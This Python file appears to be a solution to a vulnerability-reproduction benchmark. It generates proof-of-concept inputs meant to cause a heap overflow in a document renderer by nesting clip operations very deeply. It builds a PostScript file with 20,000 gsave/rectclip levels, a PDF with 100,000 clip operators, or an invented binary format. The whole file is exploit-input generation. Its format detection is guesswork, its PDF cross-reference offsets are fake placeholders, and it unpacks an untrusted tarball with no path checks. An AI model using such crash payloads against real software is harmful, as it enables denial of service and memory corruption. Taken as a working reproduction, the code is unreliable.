import os
import tarfile
import tempfile
import subprocess
import struct
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract and analyze the source to understand the format
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for clues about the format by examining files
            # This is a simplified heuristic - in reality would need more analysis
            format_info = self._analyze_source(tmpdir)
            
            # Generate PoC based on discovered format
            if format_info.get('type') == 'ps' or 'postscript' in str(format_info).lower():
                return self._generate_postscript_poc()
            elif format_info.get('type') == 'pdf' or '.pdf' in str(format_info).lower():
                return self._generate_pdf_poc()
            else:
                # Default: generate a binary format with deeply nested clip operations
                return self._generate_generic_poc()
    
    def _analyze_source(self, dir_path: str) -> dict:
        """Analyze source code to determine format."""
        info = {'type': 'unknown'}
        
        # Look for common file extensions and content
        for root, _, files in os.walk(dir_path):
            for file in files:
                if file.endswith('.ps') or 'postscript' in file.lower():
                    info['type'] = 'ps'
                    return info
                elif file.endswith('.pdf'):
                    info['type'] = 'pdf'
                    return info
                elif file.endswith('.c') or file.endswith('.cpp'):
                    try:
                        with open(os.path.join(root, file), 'r', errors='ignore') as f:
                            content = f.read().lower()
                            if 'clip' in content and 'nest' in content:
                                # Look for format hints in comments
                                if 'postscript' in content:
                                    info['type'] = 'ps'
                                elif 'pdf' in content:
                                    info['type'] = 'pdf'
                    except:
                        pass
        
        return info
    
    def _generate_postscript_poc(self) -> bytes:
        """Generate PostScript PoC with deep clip nesting."""
        # Create a PostScript file with deeply nested clip operations
        # This structure pushes clip marks without proper depth checking
        poc = b"""%!PS-Adobe-3.0
<< /PageSize [612 792] >> setpagedevice
0 0 612 792 rectclip
gsave
"""
        
        # Add many nested clip operations - enough to overflow the clip stack
        # Using a combination of gsave and clip operations
        for i in range(20000):  # Enough to cause heap overflow
            poc += f"""gsave
{i % 100} {i % 100} {200 + i % 300} {200 + i % 300} rectclip
""".encode()
        
        poc += b"""grestoreall
showpage
"""
        
        return poc
    
    def _generate_pdf_poc(self) -> bytes:
        """Generate PDF PoC with deep clip nesting."""
        # PDF header
        pdf = b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 5 0 R >>
stream
"""
        
        # PDF content stream with many clip operations
        stream = b"""q
"""
        
        # Add many clip operations using W operator (clip)
        for i in range(100000):  # Large number to trigger overflow
            stream += f"""{i % 100} {i % 100} {200 + i % 300} {200 + i % 300} re
W
n
""".encode()
        
        stream += b"""Q
"""
        
        pdf += stream
        pdf += b"""endstream
endobj
5 0 obj
"""
        pdf += str(len(stream)).encode()
        pdf += b"""
endobj
xref
0 6
0000000000 65535 f 
0000000010 00000 n 
0000000050 00000 n 
0000000100 00000 n 
0000000150 00000 n 
0000000200 00000 n 
trailer
<< /Size 6 /Root 1 0 R >>
startxref
"""
        pdf += str(len(pdf) + 10).encode()
        pdf += b"""
%%EOF"""
        
        return pdf
    
    def _generate_generic_poc(self) -> bytes:
        """Generate generic binary PoC with clip operations."""
        # Create a binary format with repeated clip push operations
        # Format: [magic][count][clip_data...]
        
        # Magic number
        poc = b'CLIP'
        
        # Large count to trigger overflow
        count = 100000
        poc += struct.pack('<I', count)
        
        # Clip data: each entry has coordinates and clip type
        for i in range(count):
            # Format: [x][y][width][height][type]
            poc += struct.pack('<ffffB', 
                float(i % 100), 
                float(i % 100),
                float(200 + i % 300),
                float(200 + i % 300),
                1  # clip push operation
            )
        
        return poc